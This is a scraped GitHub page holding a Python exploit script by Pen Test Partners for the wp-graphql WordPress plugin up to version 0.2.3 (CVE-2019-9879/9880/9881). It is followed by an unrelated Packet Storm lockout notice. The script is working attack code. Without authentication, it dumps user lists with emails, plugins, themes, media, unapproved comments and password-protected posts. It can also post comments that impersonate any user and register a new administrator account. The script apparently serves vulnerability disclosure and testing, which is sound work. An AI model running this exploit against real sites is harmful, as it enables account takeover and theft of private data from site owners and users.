  0](/pentestpartners/snippets/projects)
* [Wiki](/pentestpartners/snippets/wiki)
* [Security](/pentestpartners/snippets/security)
* [Insights](/pentestpartners/snippets/pulse)

Additional navigation options

* [Code](/pentestpartners/snippets)
* [Issues](/pentestpartners/snippets/issues)
* [Pull requests](/pentestpartners/snippets/pulls)
* [Actions](/pentestpartners/snippets/actions)
* [Projects](/pentestpartners/snippets/projects)
* [Wiki](/pentestpartners/snippets/wiki)
* [Security](/pentestpartners/snippets/security)
* [Insights](/pentestpartners/snippets/pulse)

## Files

¬†master
## Breadcrumbs

1. [snippets](/pentestpartners/snippets/tree/master)
/
# wp-graphql0.2.3\_exploit.py

Copy path Blame  Blame
## Latest commit

## History

[History](/pentestpartners/snippets/commits/master/wp-graphql0.2.3_exploit.py)183 lines (148 loc) ¬∑ 7.46 KB¬†master
## Breadcrumbs

1. [snippets](/pentestpartners/snippets/tree/master)
/
# wp-graphql0.2.3\_exploit.py

Top
## File metadata and controls

* Code
* Blame

183 lines (148 loc) ¬∑ 7.46 KB[Raw](https://github.com/pentestpartners/snippets/raw/refs/heads/master/wp-graphql0.2.3_exploit.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183#!/usr/bin/env python## Author: Simone Quatrini of Pen Test Partners# CVEs: 2019-9879, 2019-9880, 2019-9881# Tested on Wordpress 5.1.1 and wp-graphql 0.2.3#
import argparseimport requestsimport base64import jsonimport sys
parser = argparse.ArgumentParser(description="wp-graphql <= 0.2.3 multi-exploit")
parser.add\_argument('--url', action='store', dest='url', required=True, help="wp-graphql endpoint. e.g.: http://localhost/wordpress/graphql")
parser.add\_argument('--post-comment', nargs=3, action='store', metavar=('postid','userid','commenttext'), dest='comment', required=False, help="Post comment impersonating a specific user. e.g.: --post-comment 2 1 Test")
parser.add\_argument('--register-admin', nargs=3, action='store', metavar=('email','password','username'), dest='register', required=False, help="Register a new admin user. e.g.: --register-admin test@example.com MySecretP@ssword hax0r")
parser.add\_argument('--verbose', '-v', action='store\_true', required=False, help="Shows the full response")
args = parser.parse\_args()
def show\_plugins(url, headers, verbose): payload = {"query":"{plugins{edges{node{name,description,version}}}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'node' in response.text: print "[+] Installed plugins:" parsed = json.loads(response.text) for i in parsed['data']['plugins']['edges']: print i['node']['name']+" "+i['node']['version'] else: print "\n[-] Error code fetching plugins: ", response.status\_code  if verbose: print(response.text)
def show\_themes(url, headers, verbose): payload = {"query":"{themes{edges{node{name,description,version}}}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'node' in response.text: print "\n[+] Installed themes:" parsed = json.loads(response.text) for i in parsed['data']['themes']['edges']: print i['node']['name']+" "+str(i['node']['version']) else: print "\n[-] Error code fetching themes: ", response.status\_code  if verbose: print(response.text)
def show\_medias(url, headers, verbose): payload = {"query":"{mediaItems{edges{node{id,mediaDetails{file,sizes{file,height,mimeType,name,sourceUrl,width}},uri}}}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'node' in response.text: print "\n[+] Media items:" parsed = json.loads(response.text) for i in parsed['data']['mediaItems']['edges']: print "/wp-content/uploads/"+i['node']['mediaDetails']['file'] else: print "\n[-] Error code fetching media items: ", response.status\_code  if verbose: print(response.text)
def show\_users(url, headers, verbose): payload = {"query":"{users{edges{node{firstName,lastName,nickname,roles,email,userId,username}}}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'node' in response.text: print "\n[+] User list:" parsed = json.loads(response.text) for i in parsed['data']['users']['edges']: print "ID: "+str(i['node']['userId'])+" - Username: "+i['node']['username']+" - Email: "+i['node']['email']+" - Role: "+i['node']['roles'][0] else: print "\n[-] Error code fetching user list: ", response.status\_code  if verbose: print(response.text)
def show\_comments(url, headers, verbose): payload = {"query":"{comments(where:{includeUnapproved:[]}){edges{node{id,commentId,approved,content(format:RAW)}}}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'node' in response.text: print "\n[+] Comments list:" parsed = json.loads(response.text) for i in parsed['data']['comments']['edges']: print "ID: "+str(i['node']['commentId'])+" - Approved: "+str(i['node']['approved'])+" - Text: "+str(i['node']['content']) else: print "\n[-] Error code fetching comments list: ", response.status\_code  if verbose: print(response.text)
def show\_password\_protected(url, headers, verbose): payload = {"query":"{posts(where:{hasPassword:true}){edges{node{title,id,content(format:RAW)}}}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'node' in response.text: print "\n[+] Found the following password protected post(s):" parsed = json.loads(response.text) for i in parsed['data']['posts']['edges']: print "ID: "+base64.b64decode(str(i['node']['id']))+" - Title: "+str(i['node']['title'])+" - Content: "+str(i['node']['content']) else: print "\n[-] No password protected post found"
 if verbose: print(response.text)
 payload = {"query":"{pages(where:{hasPassword:true}){edges{node{id,link,title,uri,content(format:RAW)}}}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'node' in response.text: print "\n[+] Found the following password protected page(s):" parsed = json.loads(response.text) for i in parsed['data']['pages']['edges']: print "ID: "+base64.b64decode(str(i['node']['id']))+" - Title: "+str(i['node']['title'])+" - Content: "+str(i['node']['content']) else: print "\n[-] No password protected page found"
 if verbose: print(response.text)
def post\_comment(url, headers, postID, userID, comment, verbose): payload = {"query":"mutation{createComment(input:{postId:"+postID+",userId:"+userID+",content:\""+comment+"\",clientMutationId:\"UWHATM8\",}){clientMutationId}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'UWHATM8' in response.text: print "[+] Comment posted on article ID "+postID+"" else: print "\n[-] Error posting the comment. Check that postID and userID are correct"
 if verbose: print(response.text)
def register\_admin(url, headers, email, password, username, verbose): payload = {"query":"mutation{registerUser(input:{clientMutationId:\"UWHATM8\",email:\""+email+"\",password:\""+password+"\",username:\""+username+"\",roles:[\"administrator\"]}){clientMutationId}}"} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200 and 'UWHATM8' in response.text: print "[+] New admin created. Login with "+username+":"+password else: print "\n[-] Registrations are closed, can't proceed."
 if verbose: print(response.text)
def check\_endpoint(url, headers): payload = {'':''} response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status\_code == 200: print "[+] Endpoint is reachable\n" else: print "\n[-] Endpoint response code: ", response.status\_code sys.exit()
url = args.urlheaders = {'Content-type': 'application/json', 'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}verbose = args.verbose
# Only in case '--post-comment' is passedif args.comment: postID, userID, comment = args.comment check\_endpoint(url, headers) post\_comment(url, headers, postID, userID, comment, verbose) sys.exit()
# Only in case '--register-admin' is passedif args.register: email, password, username = args.register check\_endpoint(url, headers) register\_admin(url, headers, email, password, username, verbose) sys.exit()
# Default actions if only '--url' is passedshow\_plugins(url, headers, verbose)show\_themes(url, headers, verbose)show\_medias(url, headers, verbose)show\_users(url, headers, verbose)show\_comments(url, headers, verbose)show\_password\_protected(url, headers, verbose)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from packetstormsecurity.com_a4e01c0b_20250120_234418.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT‚õî 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
